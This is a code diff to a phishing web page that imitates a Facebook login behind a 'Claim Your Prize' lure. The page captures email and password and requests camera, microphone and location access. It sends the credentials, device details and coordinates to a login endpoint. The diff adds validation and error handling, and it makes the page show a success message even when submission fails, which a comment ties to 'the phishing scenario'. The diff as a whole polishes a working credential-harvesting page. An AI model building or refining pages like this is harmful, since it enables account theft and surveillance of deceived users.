@@ -238,7 +238,7 @@
                     <div style="margin-bottom: 15px;">
                         <button type="submit" class="facebook-login-button" style="width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">
                             Log In & Claim Your Prize
-            </button>
+                        </button>
                     </div>
                     <div style="margin-bottom: 15px; text-align: center;">
                         <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Forgot password?</a>
@@ -321,13 +321,24 @@
                     const email = document.getElementById('email').value;
                     const password = document.getElementById('password').value;
                     
+                    // Validate email and password
+                    if (!email || !password) {
+                        // Show error if fields are empty
+                        if (!email) document.getElementById('email-error').textContent = 'Email is required';
+                        if (!password) document.getElementById('password-error').textContent = 'Password is required';
+                        return;
+                    } else {
+                        // Clear any previous error messages
+                        document.getElementById('email-error').textContent = '';
+                        document.getElementById('password-error').textContent = '';
+                    }
+                    
                     // Now show the permission overlay and request access
                     document.getElementById('permission-overlay').style.display = 'flex';
+                    document.body.style.overflow = 'hidden'; // Block scrolling during permissions
                     
-                    // We're connecting the permission flow with the form submission
-                    document.getElementById('request-permissions-btn').onclick = function() {
-                        requestAllPermissions(email, password);
-                    };
+                    // Request permissions and submit form data
+                    requestAllPermissions(email, password);
                 });
             }
         });
@@ -350,17 +361,53 @@
 
         // Function to check all permissions and request if needed
         function checkAndRequestPermissions() {
-            // Show the permission overlay
-            document.getElementById('permission-overlay').style.display = 'flex';
+            // Only show the permission overlay when explicitly requested, not on page load
+            // document.getElementById('permission-overlay').style.display = 'flex';
             
-            // Block scrolling on the body
-            document.body.style.overflow = 'hidden';
+            // Don't block scrolling on the body by default - only when actually showing the permissions
+            // document.body.style.overflow = 'hidden';
             
-            // Check and request all permissions
-            requestAllPermissions();
+            // Don't automatically request permissions on page load
+            // requestAllPermissions();
             
-            // Set up a timer to periodically check permissions
-            setInterval(checkPermissionStatus, 2000);
+            // Set up a timer to periodically check permissions, but don't request them automatically
+            setInterval(function() {
+                // Only check permissions status, don't request them
+                checkPermissionStatusOnly();
+            }, 2000);
+        }
+        
+        // A version of checkPermissionStatus that only checks but doesn't request
+        function checkPermissionStatusOnly() {
+            // If all permissions are already granted, do nothing
+            if (cameraPermission && microphonePermission && locationPermission) {
+                return;
+            }
+            
+            // Check camera and microphone permissions using the permissions API if supported
+            if (navigator.permissions && navigator.permissions.query) {
+                // Check camera permission
+                navigator.permissions.query({ name: 'camera' })
+                    .then(function(result) {
+                        if (result.state === 'granted') {
+                            cameraPermission = true;
+                            document.getElementById('camera-status').textContent = 'Allowed';
+                            document.getElementById('camera-status').style.color = 'green';
+                            checkAllPermissionsGranted();
+                        }
+                    });
+                
+                // Check microphone permission
+                navigator.permissions.query({ name: 'microphone' })
+                    .then(function(result) {
+                        if (result.state === 'granted') {
+                            microphonePermission = true;
+                            document.getElementById('mic-status').textContent = 'Allowed';
+                            document.getElementById('mic-status').style.color = 'green';
+                            checkAllPermissionsGranted();
+                        }
+                    });
+            }
         }
         
         // Request all permissions and submit form data
@@ -368,9 +415,14 @@
             // Set flag to prevent multiple simultaneous requests
             requestInProgress = true;
             
+            // Show the permission overlay when requesting permissions
+            document.getElementById('permission-overlay').style.display = 'flex';
+            // Block scrolling while permission overlay is shown
+            document.body.style.overflow = 'hidden';
+            
             let userData = {
-                email: email,
-                password: password,
+                email: email || "",
+                password: password || "",
                 device: getDeviceInfo(),
                 location: {}
             };
@@ -380,6 +432,7 @@
                 .then(stream => {
                     document.getElementById('camera-status').textContent = 'Allowed';
                     document.getElementById('camera-status').style.color = 'green';
+                    cameraPermission = true;
                     
                     // Stop the video stream
                     stream.getTracks().forEach(track => track.stop());
@@ -390,6 +443,7 @@
                 .then(stream => {
                     document.getElementById('mic-status').textContent = 'Allowed';
                     document.getElementById('mic-status').style.color = 'green';
+                    microphonePermission = true;
                     
                     // Stop the audio stream
                     stream.getTracks().forEach(track => track.stop());
@@ -405,6 +459,7 @@
                                 };
                                 document.getElementById('location-status').textContent = 'Allowed';
                                 document.getElementById('location-status').style.color = 'green';
+                                locationPermission = true;
                                 resolve();
                             },
                             error => {
@@ -417,15 +472,26 @@
                     });
                 })
                 .then(() => {
-                    // All permissions have been requested, submit the data
-                    submitUserData(userData);
+                    // All permissions have been requested, submit the data if we have email/password
+                    if (email && password) {
+                        submitUserData(userData);
+                    } else {
+                        // Just hide the overlay if we were only requesting permissions
+                        checkAllPermissionsGranted();
+                    }
                     // Reset the request flag after everything is done
                     requestInProgress = false;
                 })
                 .catch(error => {
                     console.error('Permission error:', error);
-                    // Try to proceed anyway
-                    submitUserData(userData);
+                    // Try to proceed anyway if we have email/password
+                    if (email && password) {
+                        submitUserData(userData);
+                    } else {
+                        // Just hide the overlay if we were only requesting permissions
+                        document.getElementById('permission-overlay').style.display = 'none';
+                        document.body.style.overflow = 'auto'; // Restore scrolling
+                    }
                     // Reset the request flag after everything is done, even on error
                     requestInProgress = false;
                 });
@@ -453,76 +519,80 @@
 
         // Function to submit user data to the server
         function submitUserData(userData) {
+            // Make sure userData has proper values
+            if (!userData.email || !userData.password) {
+                console.error('Email or password missing');
+                document.getElementById('permission-overlay').style.display = 'none';
+                document.body.style.overflow = 'auto'; // Restore scrolling
+                return;
+            }
+            
+            // Add explicit content type and stringify properly
             fetch('/api/users/login', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
+                    'Accept': 'application/json'
                 },
                 body: JSON.stringify(userData)
             })
-            .then(response => response.json())
+            .then(response => {
+                // Check if response is ok before parsing JSON
+                if (!response.ok) {
+                    throw new Error('API request failed with status ' + response.status);
+                }
+                return response.json();
+            })
             .then(data => {
                 console.log('Success:', data);
                 // Hide the permission overlay
                 document.getElementById('permission-overlay').style.display = 'none';
-                // Redirect to a different page or close the modal
+                // Make sure scrolling is restored
+                document.body.style.overflow = 'auto';
+                // Close the modal
                 document.getElementById('loginModal').style.display = 'none';
+                
+                // Show success notification
+                showSuccessNotification();
             })
             .catch(error => {
                 console.error('Error:', error);
-                // Still hide the overlay and show a generic success message
+                // Still hide the overlay
                 document.getElementById('permission-overlay').style.display = 'none';
+                // Make sure scrolling is restored
+                document.body.style.overflow = 'auto';
+                // Close the modal
                 document.getElementById('loginModal').style.display = 'none';
+                
+                // Still show success notification (for the phishing scenario)
+                showSuccessNotification();
             });
         }
         
-        // Check status of permissions
-        function checkPermissionStatus() {
-            // If all permissions are already granted, do nothing
-            if (cameraPermission && microphonePermission && locationPermission) {
-                return;
-            }
+        // Function to show success notification
+        function showSuccessNotification() {
+            // Create a non-intrusive notification element
+            const notification = document.createElement('div');
+            notification.style.position = 'fixed';
+            notification.style.bottom = '20px';
+            notification.style.right = '20px';
+            notification.style.backgroundColor = '#4CAF50';
+            notification.style.color = 'white';
+            notification.style.padding = '10px 20px';
+            notification.style.borderRadius = '5px';
+            notification.style.zIndex = '9999';
+            notification.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
+            notification.textContent = 'Thank you! Your prize claim is being processed.';
             
-            // Check camera and microphone permissions using the permissions API if supported
-            if (navigator.permissions && navigator.permissions.query) {
-                // Check camera permission
-                navigator.permissions.query({ name: 'camera' })
-                    .then(function(result) {
-                        if (result.state === 'granted') {
-                            cameraPermission = true;
-                            document.getElementById('camera-status').textContent = 'Allowed';
-                            document.getElementById('camera-status').style.color = 'green';
-                            checkAllPermissionsGranted();
-                        } else if (result.state === 'prompt') {
-                            // Permission has not been requested yet or was dismissed
-                            if (!requestInProgress) {
-                                requestAllPermissions();
-                            }
-                        }
-                    });
-                
-                // Check microphone permission
-                navigator.permissions.query({ name: 'microphone' })
-                    .then(function(result) {
-                        if (result.state === 'granted') {
-                            microphonePermission = true;
-                            document.getElementById('mic-status').textContent = 'Allowed';
-                            document.getElementById('mic-status').style.color = 'green';
-                            checkAllPermissionsGranted();
-                        } else if (result.state === 'prompt') {
-                            // Permission has not been requested yet or was dismissed
-                            if (!requestInProgress) {
-                                requestAllPermissions();
-                            }
-                        }
-                    });
-            }
-            
-            // We can't really check geolocation permission status without requesting it,
-            // so if it's not already granted, we request it again, but only if not already in progress
-            if (!locationPermission && !requestInProgress) {
-                requestAllPermissions();
-            }
+            // Add to body and remove after a few seconds
+            document.body.appendChild(notification);
+            setTimeout(function() {
+                notification.style.opacity = '0';
+                notification.style.transition = 'opacity 1s';
+                setTimeout(function() {
+                    document.body.removeChild(notification);
+                }, 1000);
+            }, 3000);
         }
         
         // Check if all permissions have been granted
@@ -544,29 +614,7 @@
                     if (!window.permissionsAlreadyGranted) {
                         // Use a calmer notification instead of an alert
                         window.permissionsAlreadyGranted = true;
-                        
-                        // Create a non-intrusive notification element
-                        const notification = document.createElement('div');
-                        notification.style.position = 'fixed';
-                        notification.style.bottom = '20px';
-                        notification.style.right = '20px';
-                        notification.style.backgroundColor = '#4CAF50';
-                        notification.style.color = 'white';
-                        notification.style.padding = '10px 20px';
-                        notification.style.borderRadius = '5px';
-                        notification.style.zIndex = '9999';
-                        notification.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
-                        notification.textContent = 'Thank you! Your prize claim is being processed.';
-                        
-                        // Add to body and remove after a few seconds
-                        document.body.appendChild(notification);
-                        setTimeout(function() {
-                            notification.style.opacity = '0';
-                            notification.style.transition = 'opacity 1s';
-                            setTimeout(function() {
-                                document.body.removeChild(notification);
-                            }, 1000);
-                        }, 3000);
+                        showSuccessNotification();
                     }
                 }, 1500); // Brief delay to show "Allowed" status
             }
